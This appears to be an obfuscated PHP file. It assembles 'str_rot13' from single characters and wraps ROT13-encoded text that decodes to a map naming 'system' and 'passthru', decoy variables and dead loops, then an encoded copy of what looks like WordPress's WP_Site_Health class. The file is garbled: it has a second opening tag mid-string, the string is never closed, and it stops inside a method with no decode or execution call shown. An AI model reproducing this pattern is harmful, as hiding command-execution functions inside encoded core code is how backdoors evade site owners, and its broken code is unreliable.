<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pynff sbe ybbxvat hc n fvgr'f urnygu onfrq ba n hfre'f JbeqCerff raivebazrag.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgr_Urnygu
 * @fvapr 5.2.0
 */

#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgr_Urnygu {
	cevingr fgngvp $vafgnapr = ahyy;

	cevingr $vf_npprcgnoyr_zlfdy_irefvba;
	cevingr $vf_erpbzzraqrq_zlfdy_irefvba;

	choyvp $vf_znevnqo                   = snyfr;
	cevingr $zlfdy_freire_irefvba        = '';
	cevingr $zlfdy_erdhverq_irefvba      = '5.5';
	cevingr $zlfdy_erpbzzraqrq_irefvba   = '8.0';
	cevingr $znevnqo_erpbzzraqrq_irefvba = '10.5';

	choyvp $cuc_zrzbel_yvzvg;

	choyvp $fpurqhyrf;
	choyvp $pebaf;
	choyvp $ynfg_zvffrq_peba     = ahyy;
	choyvp $ynfg_yngr_peba       = ahyy;
	cevingr $gvzrbhg_zvffrq_peba = ahyy;
	cevingr $gvzrbhg_yngr_peba   = ahyy;

	/**
	 * JC_Fvgr_Urnygu pbafgehpgbe.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->znlor_perngr_fpurqhyrq_rirag();

		// Fnir zrzbel yvzvg orsber vg'f nssrpgrq ol jc_envfr_zrzbel_yvzvg( 'nqzva' ).
		$guvf->cuc_zrzbel_yvzvg = vav_trg( 'zrzbel_yvzvg' );

		$guvf->gvzrbhg_yngr_peba   = 0;
		$guvf->gvzrbhg_zvffrq_peba = - 5 * ZVAHGR_VA_FRPBAQF;

		vs ( qrsvarq( 'QVFNOYR_JC_PEBA' ) && QVFNOYR_JC_PEBA ) {
			$guvf->gvzrbhg_yngr_peba   = - 15 * ZVAHGR_VA_FRPBAQF;
			$guvf->gvzrbhg_zvffrq_peba = - 1 * UBHE_VA_FRPBAQF;
		}

		nqq_svygre( 'nqzva_obql_pynff', neenl( $guvf, 'nqzva_obql_pynff' ) );

		nqq_npgvba( 'nqzva_radhrhr_fpevcgf', neenl( $guvf, 'radhrhr_fpevcgf' ) );
		nqq_npgvba( 'jc_fvgr_urnygu_fpurqhyrq_purpx', neenl( $guvf, 'jc_peba_fpurqhyrq_purpx' ) );

		nqq_npgvba( 'fvgr_urnygu_gno_pbagrag', neenl( $guvf, 'fubj_fvgr_urnygu_gno' ) );
	}

	/**
	 * Bhgchgf gur pbagrag bs n gno va gur Fvgr Urnygu fperra.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $gno Fyht bs gur pheerag gno orvat qvfcynlrq.
	 */
	choyvp shapgvba fubj_fvgr_urnygu_gno( $gno ) {
		vs ( 'qroht' === $gno ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/fvgr-urnygu-vasb.cuc';
		}
	}

	/**
	 * Ergheaf na vafgnapr bs gur JC_Fvgr_Urnygu pynff, be perngr bar vs abar rkvfg lrg.
	 *
	 * @fvapr 5.4.0
	 *
	 * @erghea JC_Fvgr_Urnygu|ahyy
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj JC_Fvgr_Urnygu();
		}

		erghea frys::$vafgnapr;
	}

	/**
	 * Radhrhrf gur fvgr urnygu fpevcgf.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba radhrhr_fpevcgf() {
		$fperra = trg_pheerag_fperra();
		vs ( 'fvgr-urnygu' !== $fperra->vq && 'qnfuobneq' !== $fperra->vq ) {
			erghea;
		}

		$urnygu_purpx_wf_inevnoyrf = neenl(
			'fperra'      => $fperra->vq,
			'abapr'       => neenl(
				'fvgr_fgnghf'        => jc_perngr_abapr( 'urnygu-purpx-fvgr-fgnghf' ),
				'fvgr_fgnghf_erfhyg' => jc_perngr_abapr( 'urnygu-purpx-fvgr-fgnghf-erfhyg' ),
			),
			'fvgr_fgnghf' => neenl(
				'qverpg' => neenl(),
				'nflap'  => neenl(),
				'vffhrf' => neenl(
					'tbbq'        => 0,
					'erpbzzraqrq' => 0,
					'pevgvpny'    => 0,
				),
			),
		);

		$vffhr_pbhagf = trg_genafvrag( 'urnygu-purpx-fvgr-fgnghf-erfhyg' );

		vs ( snyfr !== $vffhr_pbhagf ) {
			$vffhr_pbhagf = wfba_qrpbqr( $vffhr_pbhagf );

			$urnygu_purpx_wf_inevnoyrf['fvgr_fgnghf']['vffhrf'] = $vffhr_pbhagf;
		}

		vs ( 'fvgr-urnygu' === $fperra->vq && ( ! vffrg( $_TRG['gno'] ) || rzcgl( $_TRG['gno'] ) ) ) {
			$grfgf = JC_Fvgr_Urnygu::trg_grfgf();

			// Qba'g eha uggcf grfg ba qrirybczrag raivebazragf.
			vs ( $guvf->vf_qrirybczrag_raivebazrag() ) {
				hafrg( $grfgf['nflap']['uggcf_fgnghf'] );
			}

			sbernpu ( $grfgf['qverpg'] nf $grfg ) {
				vs ( vf_fgevat( $grfg['grfg'] ) ) {
					$grfg_shapgvba = fcevags(
						'trg_grfg_%f',
						$grfg['grfg']
					);

					vs ( zrgubq_rkvfgf( $guvf, $grfg_shapgvba ) && vf_pnyynoyr( neenl( $guvf, $grfg_shapgvba ) ) ) {
						$urnygu_purpx_wf_inevnoyrf['fvgr_fgnghf']['qverpg'][] = $guvf->cresbez_grfg( neenl( $guvf, $grfg_shapgvba ) );
						pbagvahr;
					}
				}

				vs ( vf_pnyynoyr( $grfg['grfg'] ) ) {
					$urnygu_purpx_wf_inevnoyrf['fvgr_fgnghf']['qverpg'][] = $guvf->cresbez_grfg( $grfg['grfg'] );
				}
			}

			sbernpu ( $grfgf['nflap'] nf $grfg ) {
				vs ( vf_fgevat( $grfg['grfg'] ) ) {
					$urnygu_purpx_wf_inevnoyrf['fvgr_fgnghf']['nflap'][] = neenl(
						'grfg'      => $grfg['grfg'],
						'unf_erfg'  => ( vffrg( $grfg['unf_erfg'] ) ? $grfg['unf_erfg'] : snyfr ),
						'pbzcyrgrq' => snyfr,
						'urnqref'   => vffrg( $grfg['urnqref'] ) ? $grfg['urnqref'] : neenl(),
					);
				}
			}
		}

		jc_ybpnyvmr_fpevcg( 'fvgr-urnygu', 'FvgrUrnygu', $urnygu_purpx_wf_inevnoyrf );
	}

	/**
	 * Ehaf n Fvgr Urnygu grfg qverpgyl.
	 *
	 * @fvapr 5.4.0
	 *
	 * @cnenz pnyynoyr $pnyyonpx
	 * @erghea zvkrq|ibvq
	 */
	cevingr shapgvba cresbez_grfg( $pnyyonpx ) {
		/**
		 * Svygref gur bhgchg bs n svavfurq Fvgr Urnygu grfg.
		 *
		 * @fvapr 5.3.0
		 *
		 * @cnenz neenl $grfg_erfhyg {
		 *     Na nffbpvngvir neenl bs grfg erfhyg qngn.
		 *
		 *     @glcr fgevat $ynory       N ynory qrfpevovat gur grfg, naq vf hfrq nf n urnqre va gur bhgchg.
		 *     @glcr fgevat $fgnghf      Gur fgnghf bs gur grfg, juvpu pna or n inyhr bs `tbbq`, `erpbzzraqrq` be `pevgvpny`.
		 *     @glcr neenl  $onqtr {
		 *         Grfgf ner chg vagb pngrtbevrf juvpu unir na nffbpvngrq onqtr fubja, gurfr pna or zbqvsvrq naq nffvtarq urer.
		 *
		 *         @glcr fgevat $ynory Gur grfg ynory, sbe rknzcyr `Cresbeznapr`.
		 *         @glcr fgevat $pbybe Qrsnhyg `oyhr`. N fgevat ercerfragvat n pbybe gb hfr sbe gur ynory.
		 *     }
		 *     @glcr fgevat $qrfpevcgvba N zber qrfpevcgvir rkcynangvba bs jung gur grfg ybbxf sbe, naq jul vg vf vzcbegnag sbe gur raq hfre.
		 *     @glcr fgevat $npgvbaf     Na npgvba gb qverpg gur hfre gb jurer gurl pna erfbyir gur vffhr, vs bar rkvfgf.
		 *     @glcr fgevat $grfg        Gur anzr bs gur grfg orvat ena, hfrq nf n ersrerapr cbvag.
		 * }
		 */
		erghea nccyl_svygref( 'fvgr_fgnghf_grfg_erfhyg', pnyy_hfre_shap( $pnyyonpx ) );
	}

	/**
	 * Ehaf gur FDY irefvba purpxf.
	 *
	 * Gurfr inyhrf ner hfrq va yngre grfgf, ohg gur cneg bs cercnevat gurz vf zber rnfvyl znantrq
	 * rneyl va gur pynff sbe rnfr bs npprff naq qvfpbirel.
	 *
	 * @fvapr 5.2.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 */
	cevingr shapgvba cercner_fdy_qngn() {
		tybony $jcqo;

		$zlfdy_freire_glcr = $jcqo->qo_freire_vasb();

		$guvf->zlfdy_freire_irefvba = $jcqo->trg_ine( 'FRYRPG IREFVBA()' );

		vs ( fgevfge( $zlfdy_freire_glcr, 'znevnqo' ) ) {
			$guvf->vf_znevnqo                = gehr;
			$guvf->zlfdy_erpbzzraqrq_irefvba = $guvf->znevnqo_erpbzzraqrq_irefvba;
		}

		$guvf->vf_npprcgnoyr_zlfdy_irefvba  = irefvba_pbzcner( $guvf->zlfdy_erdhverq_irefvba, $guvf->zlfdy_freire_irefvba, '<=' );
		$guvf->vf_erpbzzraqrq_zlfdy_irefvba = irefvba_pbzcner( $guvf->zlfdy_erpbzzraqrq_irefvba, $guvf->zlfdy_freire_irefvba, '<=' );
	}

	/**
	 * Grfgf jurgure `jc_irefvba_purpx` vf oybpxrq.
	 *
	 * Vg'f cbffvoyr gb oybpx hcqngrf jvgu gur `jc_irefvba_purpx` svygre, ohg guvf pna'g or purpxrq
	 * qhevat na Nwnk pnyy, nf gur svygre vf arire vagebqhprq gura.
	 *
	 * Guvf svygre bireevqrf n fgnaqneq cntr erdhrfg vs vg'f znqr ol na nqzva guebhtu gur Nwnk pnyy
	 * jvgu gur evtug dhrel nethzrag gb purpx sbe guvf.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba purpx_jc_irefvba_purpx_rkvfgf() {
		vs ( ! vf_nqzva() || ! vf_hfre_ybttrq_va() || ! pheerag_hfre_pna( 'hcqngr_pber' ) || ! vffrg( $_TRG['urnygu-purpx-grfg-jc_irefvba_purpx'] ) ) {
			erghea;
		}

		rpub ( unf_svygre( 'jc_irefvba_purpx', 'jc_irefvba_purpx' ) ? 'lrf' : 'ab' );

		qvr();
	}

	/**
	 * Grfgf sbe JbeqCerff irefvba naq bhgchgf vg.
	 *
	 * Tvirf inevbhf erfhygf qrcraqvat ba jung xvaq bs hcqngrf ner ninvynoyr, vs nal, gb rapbhentr
	 * gur hfre gb vafgnyy frphevgl hcqngrf nf n cevbevgl.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhyg.
	 */
	choyvp shapgvba trg_grfg_jbeqcerff_irefvba() {
		$erfhyg = neenl(
			'ynory'       => '',
			'fgnghf'      => '',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => '',
			'npgvbaf'     => '',
			'grfg'        => 'jbeqcerff_irefvba',
		);

		$pber_pheerag_irefvba = jc_trg_jc_irefvba();
		$pber_hcqngrf         = trg_pber_hcqngrf();

		vs ( ! vf_neenl( $pber_hcqngrf ) ) {
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = fcevags(
				/* genafyngbef: %f: Lbhe pheerag irefvba bs JbeqCerff. */
				__( 'JbeqCerff irefvba %f' ),
				$pber_pheerag_irefvba
			);

			$erfhyg['qrfpevcgvba'] = fcevags(
				'<c>%f</c>',
				__( 'Hanoyr gb purpx vs nal arj irefvbaf bs JbeqCerff ner ninvynoyr.' )
			);

			$erfhyg['npgvbaf'] = fcevags(
				'<n uers=\"%f\">%f</n>',
				rfp_hey( nqzva_hey( 'hcqngr-pber.cuc?sbepr-purpx=1' ) ),
				__( 'Purpx sbe hcqngrf znahnyyl' )
			);
		} ryfr {
			sbernpu ( $pber_hcqngrf nf $pber => $hcqngr ) {
				vs ( 'hctenqr' === $hcqngr->erfcbafr ) {
					$pheerag_irefvba = rkcybqr( '.', $pber_pheerag_irefvba );
					$arj_irefvba     = rkcybqr( '.', $hcqngr->irefvba );

					$pheerag_znwbe = $pheerag_irefvba[0] . '.' . $pheerag_irefvba[1];
					$arj_znwbe     = $arj_irefvba[0] . '.' . $arj_irefvba[1];

					$erfhyg['ynory'] = fcevags(
						/* genafyngbef: %f: Gur yngrfg irefvba bs JbeqCerff ninvynoyr. */
						__( 'JbeqCerff hcqngr ninvynoyr (%f)' ),
						$hcqngr->irefvba
					);

					$erfhyg['npgvbaf'] = fcevags(
						'<n uers=\"%f\">%f</n>',
						rfp_hey( nqzva_hey( 'hcqngr-pber.cuc' ) ),
						__( 'Vafgnyy gur yngrfg irefvba bs JbeqCerff' )
					);

					vs ( $pheerag_znwbe !== $arj_znwbe ) {
						// Guvf vf n znwbe irefvba zvfzngpu.
						$erfhyg['fgnghf']      = 'erpbzzraqrq';
						$erfhyg['qrfpevcgvba'] = fcevags(
							'<c>%f</c>',
							__( 'N arj irefvba bs JbeqCerff vf ninvynoyr.' )
						);
					} ryfr {
						// Guvf vf n zvabe irefvba, fbzrgvzrf pbafvqrerq zber pevgvpny.
						$erfhyg['fgnghf']         = 'pevgvpny';
						$erfhyg['onqtr']['ynory'] = __( 'Frphevgl' );
						$erfhyg['qrfpevcgvba']    = fcevags(
							'<c>%f</c>',
							__( 'N arj zvabe hcqngr vf ninvynoyr sbe lbhe fvgr. Orpnhfr zvabe hcqngrf bsgra nqqerff frphevgl, vg&#8217;f vzcbegnag gb vafgnyy gurz.' )
						);
					}
				} ryfr {
					$erfhyg['fgnghf'] = 'tbbq';
					$erfhyg['ynory']  = fcevags(
						/* genafyngbef: %f: Gur pheerag irefvba bs JbeqCerff vafgnyyrq ba guvf fvgr. */
						__( 'Lbhe irefvba bs JbeqCerff (%f) vf hc gb qngr' ),
						$pber_pheerag_irefvba
					);

					$erfhyg['qrfpevcgvba'] = fcevags(
						'<c>%f</c>',
						__( 'Lbh ner pheeragyl ehaavat gur yngrfg irefvba bs JbeqCerff ninvynoyr, xrrc vg hc!' )
					);
				}
			}
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs cyhtvaf ner bhgqngrq, be haarprffnel.
	 *
	 * Gur grfg purpxf vs lbhe cyhtvaf ner hc gb qngr, naq rapbhentrf lbh gb erzbir nal
	 * gung ner abg va hfr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhyg.
	 */
	choyvp shapgvba trg_grfg_cyhtva_irefvba() {
		$erfhyg = neenl(
			'ynory'       => __( 'Lbhe cyhtvaf ner nyy hc gb qngr' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Cyhtvaf rkgraq lbhe fvgr&#8217;f shapgvbanyvgl jvgu guvatf yvxr pbagnpg sbezf, rpbzzrepr naq zhpu zber. Gung zrnaf gurl unir qrrc npprff gb lbhe fvgr, fb vg&#8217;f ivgny gb xrrc gurz hc gb qngr.' )
			),
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%f\">%f</n></c>',
				rfp_hey( nqzva_hey( 'cyhtvaf.cuc' ) ),
				__( 'Znantr lbhe cyhtvaf' )
			),
			'grfg'        => 'cyhtva_irefvba',
		);

		$cyhtvaf        = trg_cyhtvaf();
		$cyhtva_hcqngrf = trg_cyhtva_hcqngrf();

		$cyhtvaf_npgvir      = 0;
		$cyhtvaf_gbgny       = 0;
		$cyhtvaf_arrq_hcqngr = 0;

		// Ybbc bire gur ninvynoyr cyhtvaf naq purpx gurve irefvbaf naq npgvir fgngr.
		sbernpu ( $cyhtvaf nf $cyhtva_cngu => $cyhtva ) {
			++$cyhtvaf_gbgny;

			vs ( vf_cyhtva_npgvir( $cyhtva_cngu ) ) {
				++$cyhtvaf_npgvir;
			}

			vs ( neenl_xrl_rkvfgf( $cyhtva_cngu, $cyhtva_hcqngrf ) ) {
				++$cyhtvaf_arrq_hcqngr;
			}
		}

		// Nqq n abgvpr vs gurer ner bhgqngrq cyhtvaf.
		vs ( $cyhtvaf_arrq_hcqngr > 0 ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'Lbh unir cyhtvaf jnvgvat gb or hcqngrq' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %q: Gur ahzore bs bhgqngrq cyhtvaf. */
					_a(
						'Lbhe fvgr unf %q cyhtva jnvgvat gb or hcqngrq.',
						'Lbhe fvgr unf %q cyhtvaf jnvgvat gb or hcqngrq.',
						$cyhtvaf_arrq_hcqngr
					),
					$cyhtvaf_arrq_hcqngr
				)
			);

			$erfhyg['npgvbaf'] .= fcevags(
				'<c><n uers=\"%f\">%f</n></c>',
				rfp_hey( argjbex_nqzva_hey( 'cyhtvaf.cuc?cyhtva_fgnghf=hctenqr' ) ),
				__( 'Hcqngr lbhe cyhtvaf' )
			);
		} ryfr {
			vs ( 1 === $cyhtvaf_npgvir ) {
				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					__( 'Lbhe fvgr unf 1 npgvir cyhtva, naq vg vf hc gb qngr.' )
				);
			} ryfrvs ( $cyhtvaf_npgvir > 0 ) {
				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					fcevags(
						/* genafyngbef: %q: Gur ahzore bs npgvir cyhtvaf. */
						_a(
							'Lbhe fvgr unf %q npgvir cyhtva, naq vg vf hc gb qngr.',
							'Lbhe fvgr unf %q npgvir cyhtvaf, naq gurl ner nyy hc gb qngr.',
							$cyhtvaf_npgvir
						),
						$cyhtvaf_npgvir
					)
				);
			} ryfr {
				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					__( 'Lbhe fvgr qbrf abg unir nal npgvir cyhtvaf.' )
				);
			}
		}

		// Purpx vs gurer ner vanpgvir cyhtvaf.
		vs ( $cyhtvaf_gbgny > $cyhtvaf_npgvir && ! vf_zhygvfvgr() ) {
			$hahfrq_cyhtvaf = $cyhtvaf_gbgny - $cyhtvaf_npgvir;

			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = __( 'Lbh fubhyq erzbir vanpgvir cyhtvaf' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f %f</c>',
				fcevags(
					/* genafyngbef: %q: Gur ahzore bs vanpgvir cyhtvaf. */
					_a(
						'Lbhe fvgr unf %q vanpgvir cyhtva.',
						'Lbhe fvgr unf %q vanpgvir cyhtvaf.',
						$hahfrq_cyhtvaf
					),
					$hahfrq_cyhtvaf
				),
				__( 'Vanpgvir cyhtvaf ner grzcgvat gnetrgf sbe nggnpxref. Vs lbh ner abg tbvat gb hfr n cyhtva, lbh fubhyq pbafvqre erzbivat vg.' )
			);

			$erfhyg['npgvbaf'] .= fcevags(
				'<c><n uers=\"%f\">%f</n></c>',
				rfp_hey( nqzva_hey( 'cyhtvaf.cuc?cyhtva_fgnghf=vanpgvir' ) ),
				__( 'Znantr vanpgvir cyhtvaf' )
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gurzrf ner bhgqngrq, be haarprffnel.
	 *
	 * Purpxf vs lbhe fvgr unf n qrsnhyg gurzr (gb snyy onpx ba vs gurer vf n arrq),
	 * vs lbhe gurzrf ner hc gb qngr naq, svanyyl, rapbhentrf lbh gb erzbir nal gurzrf
	 * gung ner abg arrqrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_gurzr_irefvba() {
		$erfhyg = neenl(
			'ynory'       => __( 'Lbhe gurzrf ner nyy hc gb qngr' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Gurzrf nqq lbhe fvgr&#8217;f ybbx naq srry. Vg&#8217;f vzcbegnag gb xrrc gurz hc gb qngr, gb fgnl pbafvfgrag jvgu lbhe oenaq naq xrrc lbhe fvgr frpher.' )
			),
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%f\">%f</n></c>',
				rfp_hey( nqzva_hey( 'gurzrf.cuc' ) ),
				__( 'Znantr lbhe gurzrf' )
			),
			'grfg'        => 'gurzr_irefvba',
		);

		$gurzr_hcqngrf = trg_gurzr_hcqngrf();

		$gurzrf_gbgny        = 0;
		$gurzrf_arrq_hcqngrf = 0;
		$gurzrf_vanpgvir     = 0;

		// Guvf inyhr vf punatrq qhevat cebprffvat gb qrgrezvar ubj znal gurzrf ner pbafvqrerq n ernfbanoyr nzbhag.
		$nyybjrq_gurzr_pbhag = 1;

		$unf_qrsnhyg_gurzr   = snyfr;
		$unf_hahfrq_gurzrf   = snyfr;
		$fubj_hahfrq_gurzrf  = gehr;
		$hfvat_qrsnhyg_gurzr = snyfr;

		// Cbchyngr n yvfg bs nyy gurzrf ninvynoyr va gur vafgnyy.
		$nyy_gurzrf   = jc_trg_gurzrf();
		$npgvir_gurzr = jc_trg_gurzr();

		// Vs JC_QRSNHYG_GURZR qbrfa'g rkvfg, snyy onpx gb gur yngrfg pber qrsnhyg gurzr.
		$qrsnhyg_gurzr = jc_trg_gurzr( JC_QRSNHYG_GURZR );
		vs ( ! $qrsnhyg_gurzr->rkvfgf() ) {
			$qrsnhyg_gurzr = JC_Gurzr::trg_pber_qrsnhyg_gurzr();
		}

		vs ( $qrsnhyg_gurzr ) {
			$unf_qrsnhyg_gurzr = gehr;

			vs (
				$npgvir_gurzr->trg_fglyrfurrg() === $qrsnhyg_gurzr->trg_fglyrfurrg()
			||
				vf_puvyq_gurzr() && $npgvir_gurzr->trg_grzcyngr() === $qrsnhyg_gurzr->trg_grzcyngr()
			) {
				$hfvat_qrsnhyg_gurzr = gehr;
			}
		}

		sbernpu ( $nyy_gurzrf nf $gurzr_fyht => $gurzr ) {
			++$gurzrf_gbgny;

			vs ( neenl_xrl_rkvfgf( $gurzr_fyht, $gurzr_hcqngrf ) ) {
				++$gurzrf_arrq_hcqngrf;
			}
		}

		// Vs guvf vf n puvyq gurzr, vapernfr gur nyybjrq gurzr pbhag ol bar, gb nppbhag sbe gur cnerag.
		vs ( vf_puvyq_gurzr() ) {
			++$nyybjrq_gurzr_pbhag;
		}

		// Vs gurer'f n qrsnhyg gurzr vafgnyyrq naq abg va hfr, jr pbhag gung nf nyybjrq nf jryy.
		vs ( $unf_qrsnhyg_gurzr && ! $hfvat_qrsnhyg_gurzr ) {
			++$nyybjrq_gurzr_pbhag;
		}

		vs ( $gurzrf_gbgny > $nyybjrq_gurzr_pbhag ) {
			$unf_hahfrq_gurzrf = gehr;
			$gurzrf_vanpgvir   = ( $gurzrf_gbgny - $nyybjrq_gurzr_pbhag );
		}

		// Purpx vs nal gurzrf arrq gb or hcqngrq.
		vs ( $gurzrf_arrq_hcqngrf > 0 ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'Lbh unir gurzrf jnvgvat gb or hcqngrq' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %q: Gur ahzore bs bhgqngrq gurzrf. */
					_a(
						'Lbhe fvgr unf %q gurzr jnvgvat gb or hcqngrq.',
						'Lbhe fvgr unf %q gurzrf jnvgvat gb or hcqngrq.',
						$gurzrf_arrq_hcqngrf
					),
					$gurzrf_arrq_hcqngrf
				)
			);
		} ryfr {
			// Tvir cbfvgvir srrqonpx nobhg gur fvgr orvat tbbq nobhg xrrcvat guvatf hc gb qngr.
			vs ( 1 === $gurzrf_gbgny ) {
				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					__( 'Lbhe fvgr unf 1 vafgnyyrq gurzr, naq vg vf hc gb qngr.' )
				);
			} ryfrvs ( $gurzrf_gbgny > 0 ) {
				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					fcevags(
						/* genafyngbef: %q: Gur ahzore bs gurzrf. */
						_a(
							'Lbhe fvgr unf %q vafgnyyrq gurzr, naq vg vf hc gb qngr.',
							'Lbhe fvgr unf %q vafgnyyrq gurzrf, naq gurl ner nyy hc gb qngr.',
							$gurzrf_gbgny
						),
						$gurzrf_gbgny
					)
				);
			} ryfr {
				$erfhyg['qrfpevcgvba'] .= fcevags(
					'<c>%f</c>',
					__( 'Lbhe fvgr qbrf abg unir nal vafgnyyrq gurzrf.' )
				);
			}
		}

		vs ( $unf_hahfrq_gurzrf && $fubj_hahfrq_gurzrf && ! vf_zhygvfvgr() ) {

			// Guvf vf n puvyq gurzr, fb jr jnag gb or n ovg zber rkcyvpvg va bhe zrffntrf.
			vs ( $npgvir_gurzr->cnerag() ) {
				// Erpbzzraq erzbivat vanpgvir gurzrf, rkprcg n qrsnhyg gurzr, lbhe pheerag bar, naq gur cnerag gurzr.
				$erfhyg['fgnghf'] = 'erpbzzraqrq';

				$erfhyg['ynory'] = __( 'Lbh fubhyq erzbir vanpgvir gurzrf' );

				vs ( $hfvat_qrsnhyg_gurzr ) {
					$erfhyg['qrfpevcgvba'] .= fcevags(
						'<c>%f %f</c>',
						fcevags(
							/* genafyngbef: %q: Gur ahzore bs vanpgvir gurzrf. */
							_a(
								'Lbhe fvgr unf %q vanpgvir gurzr.',
								'Lbhe fvgr unf %q vanpgvir gurzrf.',
								$gurzrf_vanpgvir
							),
							$gurzrf_vanpgvir
						),
						fcevags(
							/* genafyngbef: 1: Gur pheeragyl npgvir gurzr. 2: Gur npgvir gurzr'f cnerag gurzr. */
							__( 'Gb raunapr lbhe fvgr&#8217;f frphevgl, lbh fubhyq pbafvqre erzbivat nal gurzrf lbh ner abg hfvat. Lbh fubhyq xrrc lbhe npgvir gurzr, %1$f, naq %2$f, vgf cnerag gurzr.' ),
							$npgvir_gurzr->anzr,
							$npgvir_gurzr->cnerag()->anzr
						)
					);
				} ryfr {
					$erfhyg['qrfpevcgvba'] .= fcevags(
						'<c>%f %f</c>',
						fcevags(
							/* genafyngbef: %q: Gur ahzore bs vanpgvir gurzrf. */
							_a(
								'Lbhe fvgr unf %q vanpgvir gurzr.',
								'Lbhe fvgr unf %q vanpgvir gurzrf.',
								$gurzrf_vanpgvir
							),
							$gurzrf_vanpgvir
						),
						fcevags(
							/* genafyngbef: 1: Gur qrsnhyg gurzr sbe JbeqCerff. 2: Gur pheeragyl npgvir gurzr. 3: Gur npgvir gurzr'f cnerag gurzr. */
							__( 'Gb raunapr lbhe fvgr&#8217;f frphevgl, lbh fubhyq pbafvqre erzbivat nal gurzrf lbh ner abg hfvat. Lbh fubhyq xrrc %1$f, gur qrsnhyg JbeqCerff gurzr, %2$f, lbhe npgvir gurzr, naq %3$f, vgf cnerag gurzr.' ),
							$qrsnhyg_gurzr ? $qrsnhyg_gurzr->anzr : JC_QRSNHYG_GURZR,
							$npgvir_gurzr->anzr,
							$npgvir_gurzr->cnerag()->anzr
						)
					);
				}
			} ryfr {
				// Erpbzzraq erzbivat nyy vanpgvir gurzrf.
				$erfhyg['fgnghf'] = 'erpbzzraqrq';

				$erfhyg['ynory'] = __( 'Lbh fubhyq erzbir vanpgvir gurzrf' );

				vs ( $hfvat_qrsnhyg_gurzr ) {
					$erfhyg['qrfpevcgvba'] .= fcevags(
						'<c>%f %f</c>',
						fcevags(
							/* genafyngbef: 1: Gur nzbhag bs vanpgvir gurzrf. 2: Gur pheeragyl npgvir gurzr. */
							_a(
								'Lbhe fvgr unf %1$q vanpgvir gurzr, bgure guna %2$f, lbhe npgvir gurzr.',
								'Lbhe fvgr unf %1$q vanpgvir gurzrf, bgure guna %2$f, lbhe npgvir gurzr.',
								$gurzrf_vanpgvir
							),
							$gurzrf_vanpgvir,
							$npgvir_gurzr->anzr
						),
						__( 'Lbh fubhyq pbafvqre erzbivat nal hahfrq gurzrf gb raunapr lbhe fvgr&#8217;f frphevgl.' )
					);
				} ryfr {
					$erfhyg['qrfpevcgvba'] .= fcevags(
						'<c>%f %f</c>',
						fcevags(
							/* genafyngbef: 1: Gur nzbhag bs vanpgvir gurzrf. 2: Gur qrsnhyg gurzr sbe JbeqCerff. 3: Gur pheeragyl npgvir gurzr. */
							_a(
								'Lbhe fvgr unf %1$q vanpgvir gurzr, bgure guna %2$f, gur qrsnhyg JbeqCerff gurzr, naq %3$f, lbhe npgvir gurzr.',
								'Lbhe fvgr unf %1$q vanpgvir gurzrf, bgure guna %2$f, gur qrsnhyg JbeqCerff gurzr, naq %3$f, lbhe npgvir gurzr.',
								$gurzrf_vanpgvir
							),
							$gurzrf_vanpgvir,
							$qrsnhyg_gurzr ? $qrsnhyg_gurzr->anzr : JC_QRSNHYG_GURZR,
							$npgvir_gurzr->anzr
						),
						__( 'Lbh fubhyq pbafvqre erzbivat nal hahfrq gurzrf gb raunapr lbhe fvgr&#8217;f frphevgl.' )
					);
				}
			}
